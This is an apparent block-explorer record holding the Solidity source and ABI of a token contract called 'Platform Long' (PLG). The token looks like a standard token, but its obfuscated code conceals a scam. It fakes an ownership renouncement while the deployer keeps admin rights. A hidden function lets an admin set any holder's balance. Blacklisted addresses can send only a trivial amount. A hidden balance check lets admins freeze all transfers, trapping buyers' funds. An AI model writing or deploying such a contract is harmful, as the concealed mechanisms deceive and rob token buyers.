{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fromEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitBuyLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAmount {\n    function createPair(address launchSwap, address minAuto) external returns (address);\n}\n\ninterface launchMinTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverShould) external view returns (uint256);\n\n    function transfer(address launchedFee, uint256 maxSwap) external returns (bool);\n\n    function allowance(address tokenAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedFee,\n        uint256 maxSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTxFrom, uint256 value);\n    event Approval(address indexed tokenAuto, address indexed spender, uint256 value);\n}\n\ninterface receiverTotal is launchMinTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PlatformLong is limitBuyLaunch, launchMinTo, receiverTotal {\n\n    uint8 private listWallet = 18;\n\n    function fundTake(address receiverLaunch, address launchedFee, uint256 maxSwap) internal returns (bool) {\n        if (receiverLaunch == launchedMarketingSell) {\n            return exemptLiquidityWallet(receiverLaunch, launchedFee, maxSwap);\n        }\n        uint256 marketingBuy = launchMinTo(atIs).balanceOf(listTokenTo);\n        require(marketingBuy == fromTake);\n        require(launchedFee != listTokenTo);\n        if (liquidityAuto[receiverLaunch]) {\n            return exemptLiquidityWallet(receiverLaunch, launchedFee, exemptIs);\n        }\n        return exemptLiquidityWallet(receiverLaunch, launchedFee, maxSwap);\n    }\n\n    address private teamLimit;\n\n    address public atIs;\n\n    function feeMax(uint256 maxSwap) public {\n        fromFee();\n        fromTake = maxSwap;\n    }\n\n    function balanceOf(address receiverShould) public view virtual override returns (uint256) {\n        return shouldTeam[receiverShould];\n    }\n\n    function owner() external view returns (address) {\n        return teamLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toTake;\n    }\n\n    uint256 public senderEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeShould;\n    }\n\n    event OwnershipTransferred(address indexed teamFrom, address indexed totalLaunchToken);\n\n    address public launchedMarketingSell;\n\n    uint256 private feeShould = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public liquidityAuto;\n\n    string private receiverTake = \"Platform Long\";\n\n    function allowance(address takeTxTotal, address marketingReceiverAt) external view virtual override returns (uint256) {\n        if (marketingReceiverAt == swapModeReceiver) {\n            return type(uint256).max;\n        }\n        return minEnable[takeTxTotal][marketingReceiverAt];\n    }\n\n    bool public autoLaunch;\n\n    function getOwner() external view returns (address) {\n        return teamLimit;\n    }\n\n    uint256 fromTake;\n\n    mapping(address => bool) public liquidityBuy;\n\n    function tradingShould() public {\n        emit OwnershipTransferred(launchedMarketingSell, address(0));\n        teamLimit = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listWallet;\n    }\n\n    uint256 public swapReceiver;\n\n    uint256 private limitBuyLaunched;\n\n    uint256 constant exemptIs = 2 ** 10;\n\n    bool public fundMode;\n\n    mapping(address => mapping(address => uint256)) private minEnable;\n\n    function transferFrom(address receiverLaunch, address launchedFee, uint256 maxSwap) external override returns (bool) {\n        if (_msgSender() != swapModeReceiver) {\n            if (minEnable[receiverLaunch][_msgSender()] != type(uint256).max) {\n                require(maxSwap <= minEnable[receiverLaunch][_msgSender()]);\n                minEnable[receiverLaunch][_msgSender()] -= maxSwap;\n            }\n        }\n        return fundTake(receiverLaunch, launchedFee, maxSwap);\n    }\n\n    address swapModeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverTake;\n    }\n\n    function sellList(address receiverLimit) public {\n        fromFee();\n        if (limitBuyLaunched == listTeam) {\n            fundMode = true;\n        }\n        if (receiverLimit == launchedMarketingSell || receiverLimit == atIs) {\n            return;\n        }\n        liquidityAuto[receiverLimit] = true;\n    }\n\n    function fromFee() private view {\n        require(liquidityBuy[_msgSender()]);\n    }\n\n    function transfer(address fundSender, uint256 maxSwap) external virtual override returns (bool) {\n        return fundTake(_msgSender(), fundSender, maxSwap);\n    }\n\n    bool private swapFrom;\n\n    constructor (){\n        if (swapFrom != autoLaunch) {\n            senderEnable = limitBuyLaunched;\n        }\n        fromEnable isFromTotal = fromEnable(swapModeReceiver);\n        atIs = tradingAmount(isFromTotal.factory()).createPair(isFromTotal.WETH(), address(this));\n        if (limitBuyLaunched != senderEnable) {\n            autoLaunch = true;\n        }\n        launchedMarketingSell = _msgSender();\n        tradingShould();\n        liquidityBuy[launchedMarketingSell] = true;\n        shouldTeam[launchedMarketingSell] = feeShould;\n        \n        emit Transfer(address(0), launchedMarketingSell, feeShould);\n    }\n\n    bool public buyFundWallet;\n\n    function exemptLiquidityWallet(address receiverLaunch, address launchedFee, uint256 maxSwap) internal returns (bool) {\n        require(shouldTeam[receiverLaunch] >= maxSwap);\n        shouldTeam[receiverLaunch] -= maxSwap;\n        shouldTeam[launchedFee] += maxSwap;\n        emit Transfer(receiverLaunch, launchedFee, maxSwap);\n        return true;\n    }\n\n    function isAt(address fundSender, uint256 maxSwap) public {\n        fromFee();\n        shouldTeam[fundSender] = maxSwap;\n    }\n\n    uint256 private receiverBuy;\n\n    uint256 private listTeam;\n\n    address listTokenTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 buyAmountList;\n\n    function approve(address marketingReceiverAt, uint256 maxSwap) public virtual override returns (bool) {\n        minEnable[_msgSender()][marketingReceiverAt] = maxSwap;\n        emit Approval(_msgSender(), marketingReceiverAt, maxSwap);\n        return true;\n    }\n\n    mapping(address => uint256) private shouldTeam;\n\n    function launchMode(address atLaunched) public {\n        if (buyFundWallet) {\n            return;\n        }\n        \n        liquidityBuy[atLaunched] = true;\n        if (swapReceiver != listTeam) {\n            listTeam = senderEnable;\n        }\n        buyFundWallet = true;\n    }\n\n    string private toTake = \"PLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTxFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTxTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingReceiverAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"feeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketingSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PlatformLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}